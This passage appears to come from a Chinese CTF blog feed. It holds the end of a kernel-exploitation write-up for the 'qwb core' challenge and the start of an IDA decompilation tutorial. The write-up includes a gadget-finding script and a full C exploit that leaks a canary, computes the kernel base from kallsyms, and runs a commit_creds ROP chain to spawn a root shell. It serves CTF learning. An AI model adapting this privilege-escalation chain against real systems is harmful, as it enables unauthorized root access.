class=\"token operator\">-</span> offset\npop_rdx_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop rdx;ret\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\npop_rcx_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop rcx;ret\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\n\nmov_rdi_rax_jmp_rcx <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"mov rdi, rax; jmp rcx;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\nmov_rdi_rax_jmp_rdx <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"mov rdi, rax; jmp rdx;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\n\nswapgs_popfq_ret  <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"swapgs; popfq; ret\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\niretq_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"iretq; ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span> offset\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t commit_creds = \"</span> <span class=\"token operator\">+</span>  <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>commit_creds<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t prepare_kernel_cred = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>prepare_kernel_cred<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t pop_rdi_ret = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"size_t pop_rdx_ret = \"</span> <span class=\"token operator\">+</span>  <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t pop_rcx_ret = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pop_rcx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t mov_rdi_rax_jmp_rcx = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mov_rdi_rax_jmp_rcx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t mov_rdi_rax_jmp_rdx = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mov_rdi_rax_jmp_rdx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"size_t swapgs_popfq_ret = \"</span> <span class=\"token operator\">+</span>  <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>swapgs_popfq_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size_t iretq_ret = \"</span> <span class=\"token operator\">+</span>   <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>iretq_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span></code></pre>\n<p>这个 python 脚本应该可以重复使用吧 (大概)</p>\n<p>我们通过 vmlinux 得到的实际上是有带基地址的，这里的基地址就是 0xffffffff81000000 我们，挨个减去得到偏移，当然也可以不减去，反正之后也是通过偏移计算真正 gadget 地址，加上多少都不影响</p>\n<p>之后是泄露 kernel 的基地址，这里可以直接读取 kallsyms 得到真实地址，通过找到 commit_creds 的真实地址 减去偏移得到 基地址，随后就可以得到各个 gadget 的真实地址，相必这些做过 ret2libc 的都很熟悉</p>\n<p>最后保存现场，执行 rop，恢复现场就大工告成了，断点下在 ret 位置，可以看到已经开始执行 rop 了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220915174518911.png\" alt=\"image-20220915174518911\"></p>\n<h2 id=\"利用脚本\"><a class=\"markdownIt-Anchor\" href=\"#利用脚本\">#</a> 利用脚本</h2>\n<p>其实在调试的过程中也是踩了不少坑，调了整整一天，只是在文中没有提及才显得比较轻松罢了</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x9c8e0</span><span class=\"token punctuation\">;</span>\n\nsize_t pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xb2f</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xa0f49</span><span class=\"token punctuation\">;</span>\nsize_t pop_rcx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x21e53</span><span class=\"token punctuation\">;</span>\n\nsize_t mov_rdi_rax_jmp_rcx <span class=\"token operator\">=</span> <span class=\"token number\">0x1ae978</span><span class=\"token punctuation\">;</span>\nsize_t mov_rdi_rax_jmp_rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x6a6d2</span><span class=\"token punctuation\">;</span>\n\nsize_t swapgs_popfq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xa012da</span><span class=\"token punctuation\">;</span>\nsize_t iretq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x50ac2</span><span class=\"token punctuation\">;</span>\n\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x9cce0</span><span class=\"token punctuation\">;</span>\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    FILE<span class=\"token operator\">*</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/kallsyms\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cannot open file kallsyms\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    size_t leak <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"commit_creds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"%lx\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            vmlinux_base <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> commit_creds<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"get vmlinux base\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    pop_rdi_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rcx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    mov_rdi_rax_jmp_rcx <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    mov_rdi_rax_jmp_rdx <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    swapgs_popfq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    iretq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t canary <span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x40</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/core\"</span> <span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x6677889c</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x6677889b</span> <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    canary <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"canary\"</span> <span class=\"token punctuation\">,</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">get_address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//commit_creads(prepare_kernel_cred(0));</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax_jmp_rdx<span class=\"token punctuation\">;</span>\n\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> swapgs_popfq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> iretq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x6677889A</span> <span class=\"token punctuation\">,</span>  <span class=\"token number\">0xffffffffffff0000</span><span class=\"token operator\">|</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// return 0;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n",
            "tags": [
                "kernel",
                "C语言"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/",
            "title": "教你用IDA",
            "date_published": "2022-09-09T06:10:27.000Z",
            "content_html": "<p>还得是你 IDA</p>\n<a id=\"more\"></a>\n<h1 id=\"教你用ida\"><a class=\"markdownIt-Anchor\" href=\"#教你用ida\">#</a> 教你用 IDA</h1>\n<p>还在为 IDA 反编译出的代码一坨答辩而烦恼吗，还在为玩不明白 IDA 而遭人鄙夷吗，那么今天来点大家想看的东西，只需 C 语言数据结构基础，教你调教出汉语言文学专业的妹妹都能看懂的代码</p>\n<h2 id=\"ida迷惑代码大赏\"><a class=\"markdownIt-Anchor\" href=\"#ida迷惑代码大赏\">#</a> IDA 迷惑代码大赏</h2>\n<ol start=\"0\">\n<li>首先介绍一下 IDA 里常见的屎，我们打开一道某城杯的 ez_linklist 题目</li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908173729472.png\" alt=\"image-20220908173729472\"></p>\n<ol>\n<li>点下 ok 找到 main 函数，映入眼帘就是一坨很经典的屎， <code>switch跳转表识别错误</code> ，属于是史里比较正常的一坨，这还不是很影响分析的部分</li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908173830651.png\" alt=\"image-20220908173830651\"></p>\n<ol start=\"2\">\n<li>看一眼侧边栏，很经典的 <code>拿掉自定义的函数名</code> ，那么本程序的数据结构肯定也就没有了</li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908174053048.png\" alt=\"image-20220908174053048\"></p>\n<ol start=\"3\">\n<li>我们向上逐个点进去看一眼，更是个寄吧， <code>各种解引用强转</code> 写的和一把米诺一样（恼），看起来就像是精神状态欠佳的人写出来的代码</li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908174307926.png\" alt=\"image-20220908174307926\"></p>\n<ol start=\"4\">\n<li>接下来点进 puts 下面的函数， <code>call了不知道个什么b玩意</code> ，鉴定为纯纯的纯纯</li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908174456180.png\" alt=\"image-20220908174456180\"></p>\n<ol start=\"5\">\n<li>这里面更是直接 <code>见红</code></li>\n</ol>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220908175347891.png\" alt=\"image-20220908175347891\"></p>\n<p>如果你也遇到了如上情况，别急，立刻点击右上角叉叉放弃本题（不是），请接着往下看</p>\n<h2 id=\"c语言变量复习\"><a class=\"markdownIt-Anchor\" href=\"#c语言变量复习\">#</a> C 语言变量复习</h2>\n<p>正经复习环节，众所周知 c 语言有很多基本变量类型，比如 int char 也有数组等等</p>\n<p>有下面的变量</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></code></pre>\n<p>a 便是 int 类型的变量，b 是一个 int 数组，他们都是我们的常见类型</p>\n<ol>\n<li>\n<p>其中 a 实际上指向了一块地址所指的值，其 int 表示将 a 地址中的东西以 int 类型来解析出来，所以我们直接输出 a 可以输出  <code>a 存放的值</code></p>\n</li>\n<li>\n<p>而 b 指向了一块地址，其 int 表示 将 b 里面的数据用 int 类型解析出来，但是直接输出 b 不能输出  <code>b 存放的值</code> ，而是输出了  <code>b 的地址</code>  ，因为  <code>b</code>  本身就是一个地址，因此需要加上 b 后面的下标也就是 b [x] , 才能输出  <code>b 对应位置所存放的值</code> ，对 b 取索引的操作也同样是 <code>对 b 以 int 类型解引用</code></p>\n</li>\n</ol>\n<p>所以之后在单独使用变量时由于前面的声明：</p>\n<p><code>a的地址所指向的值</code> 被 c 语言直接当成了 a 的值 。</p>\n<p><code>b的地址</code> 被 c 语言当成了 b 的值，<strong>因此，我们也将 b 称之为指针</strong>。</p>\n<p>接下来我们对变量进行赋值并输出</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">114514</span><span class=\"token 